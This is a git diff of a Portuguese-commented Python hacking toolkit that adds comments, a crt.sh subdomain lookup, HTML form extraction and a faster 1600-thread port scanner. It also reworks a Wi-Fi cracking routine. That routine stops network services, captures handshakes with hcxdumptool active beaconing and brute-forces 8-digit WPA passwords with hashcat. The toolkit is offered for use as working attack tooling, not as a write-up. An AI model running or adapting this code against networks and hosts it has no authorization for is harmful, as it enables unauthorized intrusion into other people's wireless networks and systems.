@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-version = "v3.72-dev"
+version = "v3.8-dev"
 
 import os
 import re
@@ -17,7 +17,9 @@ from requests.exceptions import SSLError
 from urllib.parse import urlparse, urljoin
 from concurrent.futures import ThreadPoolExecutor as exx
 
-
+###########################################################
+## BANNER PRINCIPAL DO PROGRAMA, EXIBINDO A VERSÃO ATUAL ##
+###########################################################
 bann = '''\033[1;33m
 888  888  888  .d88b.   8888b.  88888b.   .d88b.  888  888  888
 888  888  888 d8P  Y8b     "88b 888 "88b d88""88b 888  888  888
@@ -57,7 +59,9 @@ def interfaces():
             print("Nenhuma interface de rede encontrada.")
             input(press)
             main()
-
+        ###################################################    
+        ## PARA CADA INTERFACE, E CRIADO UM ITEM NO MENU ##
+        ###################################################
         print("\nSelecione a interface de rede:")
         for i, interface in enumerate((interfaces), 1):
             print(f"\033[0;34m[{i}]\033[m - {interface}")
@@ -68,7 +72,8 @@ def interfaces():
                 if escolha < 0 or escolha > len(interfaces):
                     raise ValueError
                 break
-
+                if escolha == 0:
+                    main()
             except ValueError:
                 print("Opção inválida.")
         
@@ -97,9 +102,16 @@ def host_discovery():
     ##########################################################
     vrf_ip = input('Digite a faixa de IP (Ex: xx.xx.xx.xx/xx): ')
     mask = vrf_ip.split('/')
+
+    ############################################
+    ## CRIA UMA VARIAVEL COM O PADRÃO DE IPV4 ##
+    ############################################
     regex = re.compile(r"^(\d{1,3}\.)\d{1,3}\.\d{1,3}\.\d{1,3}$")
 
     try:
+        ##################################
+        ## TRATAMENTO DE "VAZIO" E MASK ##
+        ##################################
         if regex.match(mask[0]) is not None and int(mask[1]) <= 32:
                 
             try:
@@ -126,11 +138,15 @@ def host_discovery():
         host_discovery()
 
     #########################################################
-    ######################## ALERTA #########################
+    #################### !!! ALERTA !!! #####################
     #########################################################
     print('\n\033[7;31m((Para cancelar segure CTRL+C))\033[m')
 
     interface = interfaces()
+
+    ###################################################
+    ## CRIA PASTA "ARQ" E REMOVE OS ARQUIVOS ANTIGOS ##
+    ###################################################
     os.system(dir)
     os.popen('rm ARQ/hosts.txt 2>/dev/null')
 
@@ -173,7 +189,10 @@ def host_discovery():
         
         except FileNotFoundError:
             print("\nO arquivo de IPs descobertos deve ser gerado.")
-
+    
+    ############################################################################
+    ## CASO DECIDA USAR O NETDISCOVERY GERA UM ARQUIVO COM OS IPS ENCONTRADOS ##
+    ############################################################################
     if sit_discovery.lower() == 's':
         os.popen('sudo apt install netdiscovery -y 2>/dev/null')
         os.popen('rm .discovery.txt 2>/dev/null ')
@@ -191,12 +210,17 @@ def host_discovery():
 ## FAZ RESOLUÇÃO DE HOSTNAME VIA SOCKET ##
 ##########################################
 def hostname_resolv():
+
     try:
         with open("ARQ/hosts.txt", "r") as f:
             lst = f.readlines()
         remove = '\n'
         lst = [l.replace(remove, "") for l in lst]
         print('Hosts descobertos:')
+        
+        #################################################################
+        ## VERIFICA O TTL DA RESPOSTA E "DEFINE" O SISTEMA OPERACIONAL ##
+        #################################################################
         for host in lst:
             try:
                 socket.setdefaulttimeout(5)
@@ -211,6 +235,9 @@ def hostname_resolv():
                 if ttl == 255:
                     OS = 'UnixLike'
 
+                #########################################
+                ## TENTA FAZER A RESOLUÇÃO DE HOSTNAME ##
+                #########################################
                 hostname = socket.gethostbyaddr(host)[0]
                 print(f'[+] {host} - ({hostname} - {OS})')
 
@@ -218,10 +245,10 @@ def hostname_resolv():
                     print(f'{host} - ({hostname})', file=f)
 
             except socket.timeout:
-                print(f'[+] {host}')
+                print(f'[+] {host} - ({OS})')
 
             except socket.herror:
-                print(f'[+] {host}')
+                print(f'[+] {host} - ({OS})')
                 
             except KeyboardInterrupt:
                 print("[-] Saindo!")
@@ -245,35 +272,43 @@ def bigscan():
     ## CRIA UM PACOTE SOCKET QUE SE CONECTA NA PORTA, E SE O RESULTADO "0", RETORNA ABERTA ##
     #########################################################################################
     def scan(ip, port, l):
+
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(1)  
-        t.sleep(0.02)
+        s.settimeout(2)  
+        print(f'{ip} - {port}')
 
         try:
             result = s.connect_ex((ip, port))
             espaco = 10 - l
             espaco = " " * espaco
             
-            if result == 0: 
+            if result != 0: 
+                pass
+
+            else:
                 with open("ARQ/portscan.txt", "a") as f:
 
-                    ####################################################
-                    ## VERIFICA SE EXISTE UM SERVIÇO RODANDO NA PORTA ##
-                    ####################################################
-                    try:
-                        service = f"{socket.getservbyport(port)}"
-                        t.sleep(0.1)
-                        print(f"{str(port)} / TCP {espaco} {service}", file=f)
-                        print(str(port) + " / TCP" + espaco + f"{service}       ")
+                        ####################################################
+                        ## VERIFICA SE EXISTE UM SERVIÇO RODANDO NA PORTA ##
+                        ####################################################
+                        try:
+                            service = f"{socket.getservbyport(port)}"
+                            print(f"{str(port)} / TCP {espaco} {service}", file=f)
+                            print(str(port) + " / TCP" + espaco + f"{service}       ")
 
-                    except socket.error:
-                        print(str(port) + " / TCP" + espaco + "Desconhecido", file=f)
-                        print(str(port) + " / TCP" + espaco + "Desconhecido")
+                        ############################################
+                        ## EM CASO DE ERRO RETORNA "DESCONHECIDO" ##
+                        ############################################
+                        except socket.error:
+                            print(str(port) + " / TCP" + espaco + "Desconhecido", file=f)
+                            print(str(port) + " / TCP" + espaco + "Desconhecido")
 
-                    except KeyboardInterrupt:
-                        print("[-] Saindo!")
-                        quit()
-
+                        except KeyboardInterrupt:
+                            print("[-] Saindo!")
+                            quit()
+        ##############################################
+        ## EM CASO DE DE COMUNICAÇÃO, EXIBE UM ERRO ##
+        ##############################################
         except (socket.timeout, ConnectionRefusedError, OSError) as err:
             print(f"Erro ao verificar porta {port} em {ip}: {err}")
 
@@ -297,7 +332,7 @@ def bigscan():
             ########################################################
             ## ATRIBUI A QUANTIDADE DE THREADS USADAS NO PORTSCAN ##
             ########################################################
-            thread = 600
+            thread = 1600
             ports = range(rang)
 
             print("\n[+] Host: " + ip_alvo)
@@ -336,10 +371,16 @@ def bigscan():
     ####################################################
     def portscan():
         os.popen('rm ARQ/portscan.txt 2>/dev/null')
+
         try:
+            ##############################################
+            ## QUESTIONA QUAL O HOSTDISCOVERY FOI FEITO ##
+            ##############################################
             sit_port = input('Deseja você usou o PADRÃO ou HOSTDISCOVERY? (P/H)')
+
             if sit_port.lower() == 'p':
                 arquivo = 'hosts'
+
             if sit_port.lower() == 'h':
                 arquivo = 'discovery'
 
@@ -506,6 +547,25 @@ def http_finder():
             thread.join()
 
 
+#=======================================================================================          
+def cert_subdomain():
+    target_domain = input('Digite o dominio: ')
+    target = target_domain.replace('www.', '').split('/')[0]
+
+    try:
+        req = requests.get(f"https://crt.sh/?q=%.{target}&output=json")
+        req.raise_for_status()
+    except requests.RequestException:
+        print("[X] Information not available!")
+
+    subdomains = sorted({value['name_value'] for value in req.json()})
+
+    print(f"\n[!] TARGET: {target} [!] \n")
+
+    for subdomain in subdomains:
+        print(subdomain)
+
+
 #=======================================================================================
 def link():
     def crawl(url):
@@ -517,7 +577,7 @@ def link():
         if response.status_code == 200:
             soup = BeautifulSoup(response.content, 'html.parser')
             links = soup.find_all('a')
-            hrefcode = {urljoin(url, link['href']) for link in links if 'href' in link.attrs} ############################################################# ESTOU EM DÚVIDA COMO FUNCIONA
+            hrefcode = {urljoin(url, link['href']) for link in links if 'href' in link.attrs}
             return hrefcode
         return []
 
@@ -621,7 +681,7 @@ def link():
         sit = input('\nDeseja salvar qo WebCrawl? (S/N) ')
         if(sit.lower() == 's'):
             print('Aguarde enquanto o arquivo está sendo salvo ...')
-            with open('craw.txt', 'w') as f:
+            with open(f'{target}_craw.txt', 'w') as f:
                 while url_process:
                     url_atual = url_process.pop()
                     os.dup2(f.fileno(), 1)
@@ -664,6 +724,28 @@ def auto_web():
                     print(f'Conteúdo do formulário:')
                     print(formulario.prettify())
                     print('---------------------------------------------------------\n')
+    try:
+        for ip in ips:
+            caminho_html = f'ARQ/WEB/{ip}/index.php'
+            with open(caminho_html, 'r', encoding='utf-8') as arquivo:
+                conteudo_html = arquivo.read()
+                soup = BeautifulSoup(conteudo_html, 'html.parser')
+                formularios = soup.find_all('form', {'action': True, 'method': True})
+
+                if ip and formularios:
+                    print('---------------------------------------------------------')
+                    print(f'\nAnalisando {ip}:\n')
+                    soup = BeautifulSoup(conteudo_html, 'html.parser')
+                    formularios = soup.find_all('form', {'action': True, 'method': True})
+
+                    for formulario in formularios:
+                        print(f'Atributo action: {formulario["action"]}')
+                        print(f'Atributo method: {formulario["method"]}')
+                        print(f'Conteúdo do formulário:')
+                        print(formulario.prettify())
+                        print('---------------------------------------------------------\n')
+    except FileNotFoundError:
+        pass
     input("Pressione Enter para continuar...")
     main()
 
@@ -1840,67 +1922,10 @@ def serverhttp():
 
 #=======================================================================================
 def wifi_hacking():
-
-    def wifi_crack():
-        ################################
-        ## EXCLUI O CONTEUDO ANTERIOR ##
-        ################################
-        os.popen('sudo rm -rf WifiCrack 2>/dev/null')
-
-        ###########################
-        ## VERIFICA DEPENDENCIAS ##
-        ###########################
-        dependencias = ["hcxdumptool", "hcxpcapngtool", "hashcat", 'xterm']
-
-        for programa in dependencias:
-            if not os.popen(f'which {programa}').read():
-                os.system(f"sudo apt install {programa}")
-
-
-        ##################################
-        ## DESABILITA O SERVIÇO DE REDE ##
-        ##################################
-        interface = interfaces()
-        
-        os.system('mkdir WifiCrack')
-
-        minutos = int(input('\033[7;31mQuantos minutos deseja realizar o DUMP? \033[m'))
-
-        ################################
-        ## EXCLUI O CONTEUDO ANTERIOR ##
-        ################################
-        os.popen('sudo rm dumpfile* essidlist hash.hc22000 2>/dev/null')
-
-        ####################################
-        ## INTERROMPE OS SERVIÇOS DE REDE ##
-        ####################################
-        os.system('sudo systemctl stop NetworkManager.service')
-        os.system('sudo systemctl stop wpa_supplicant.service')
-        
-        try:
-            #####################################
-            ## CAPTURA DADOS DURANTE 5 MINUTOS ##
-            #####################################
-            t.sleep(2)
-            os.system(f'sudo hcxdumptool -i {interface} -o dumpfile.pcapng --active_beacon --enable_status=15 --tot={minutos} ')
-        except KeyboardInterrupt:
-            pass
-        
-        #############################################################################
-        ## CASO CANCELE ANTES DO TERMINO DO PROCESSO, RESTAURA OS SERVIÇOS DE REDE ##
-        #############################################################################
-        if KeyboardInterrupt:
-            os.system('sudo systemctl start NetworkManager.service')
-            os.system('sudo systemctl start wpa_supplicant.service')
-
-        
-        ##################################
-        ## RESTAURA OS SERVIÇOS DE REDE ##
-        ##################################
-        os.system('sudo systemctl start NetworkManager.service')
-        os.system('sudo systemctl start wpa_supplicant.service')
-        input('Pressione para continuar')
-
+    ################################################
+    ## FUNÇÃO PARA QUEBRAR SENHA DENTRO DE UM FOR ##
+    ################################################
+    def magic_crack():
         try:
             #######################
             #CONVERTE PARA HASHCAT#
@@ -1911,7 +1936,7 @@ def wifi_hacking():
                 dump = f.read()
             
         except FileNotFoundError:
-            print('\033[7;31mO arquivo "WifiCrack/*.hc22000" não foi gerado, deixe o DUMP por mais tempo.\033[m')
+            print('\033[7;31mO arquivo "WifiCrack/*.hc22000" não foi encontrado, deixe o DUMP por mais tempo.\033[m')
             exit()
 
 
@@ -1921,19 +1946,90 @@ def wifi_hacking():
             nome_hash = hash.split('*')
             with open(f'WifiCrack/{nome_hash[3]}.hc22000','w') as f:
                 f.write(hash)
+            print()                
             print(nome_hash[3])
             print('#################################################################################################################')
             os.system(f"hashcat -m 22000 WifiCrack/{nome_hash[3]}.hc22000 -a 3 ?d?d?d?d?d?d?d?d | tee WifiCrack/{nome_hash[3]}.result")
+        
+            #with open(f'WifiCrack/{nome_hash[3]}.result','r') as f:
+            #    result = f.read()
+            #    if 'Exhausted' in result:
+            #        os.system(f"hashcat -m 22000 WifiCrack/{nome_hash[3]}.hc22000 -a 3 ?h?h?h?h?h?h?h?h | tee WifiCrack/{nome_hash[3]}.result")
+
+
+
+            #em caso de erro:
+            #sudo ifconfig wlxd03745fbcadc down && sudo iwconfig wlxd03745fbcadc mode managed && sudo ifconfig wlxd03745fbcadc up
+            #sudo ifconfig wlp4s0 down && sudo iwconfig wlp4s0 mode managed && sudo ifconfig wlp4s0 up
+
+    def wifi_crack():
+
+        ###########################
+        ## VERIFICA DEPENDENCIAS ##
+        ###########################
+        dependencias = ["hcxdumptool", "hcxpcapngtool", "hashcat", 'xterm']
+
+        for programa in dependencias:
+            if not os.popen(f'which {programa}').read():
+                os.system(f"sudo apt install {programa}")
+
+        interface = interfaces()
+
+        ################################
+        ## EXCLUI O CONTEUDO ANTERIOR ##
+        ################################
+        os.popen('sudo rm -rf WifiCrack 2>/dev/null')
+        t.sleep(1)
+        os.system('mkdir WifiCrack')
+
+        sitwifi = input('Já existe o arquivo "Wificrack/hash.hc22000"? (S/N) ')
+        if sitwifi.lower() == 's':
+            magic_crack()
+        elif sitwifi.lower() == 'n':
+            minutos = int(input('\033[7;31mQuantos minutos deseja realizar o DUMP? \033[m'))
+
+            ################################
+            ## EXCLUI O CONTEUDO ANTERIOR ##
+            ################################
+            os.popen('sudo rm dumpfile* essidlist hash.hc22000 2>/dev/null')
+
+            ####################################
+            ## INTERROMPE OS SERVIÇOS DE REDE ##
+            ####################################
+            os.system('sudo systemctl stop NetworkManager.service')
+            os.system('sudo systemctl stop wpa_supplicant.service')
             
-            '''
-            hashcat -m 22000 hash.hc22000 wordlist.txt
-            hashcat -m 22000 hash.hc22000 -a 3 --increment --increment-min 8 --increment-max 18 ?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d
+            try:
+                #####################################
+                ## CAPTURA DADOS DURANTE 5 MINUTOS ##
+                #####################################
+                t.sleep(2)
+                os.system(f'sudo hcxdumptool -i {interface} -o dumpfile.pcapng --active_beacon --enable_status=15 --tot={minutos} ')
+            except KeyboardInterrupt:
+                pass
+            
+            #############################################################################
+            ## CASO CANCELE ANTES DO TERMINO DO PROCESSO, RESTAURA OS SERVIÇOS DE REDE ##
+            #############################################################################
+            if KeyboardInterrupt:
+                os.system('sudo systemctl start NetworkManager.service')
+                os.system('sudo systemctl start wpa_supplicant.service')
 
-            em caso de erro:
-            sudo ifconfig wlxd03745fbcadc down && sudo iwconfig wlxd03745fbcadc mode managed && sudo ifconfig wlxd03745fbcadc up
-            sudo ifconfig wlp4s0 down && sudo iwconfig wlp4s0 mode managed && sudo ifconfig wlp4s0 up
+            
+            ##################################
+            ## RESTAURA OS SERVIÇOS DE REDE ##
+            ##################################
+            os.system('sudo systemctl start NetworkManager.service')
+            os.system('sudo systemctl start wpa_supplicant.service')
+            input('Pressione para continuar')
 
-            '''
+            magic_crack()
+
+        else:
+            print('Entrada inválida.')
+            input(press)
+            main()
+
     def wifi_scan():
         def scan(s):
             os.system('rm wash')
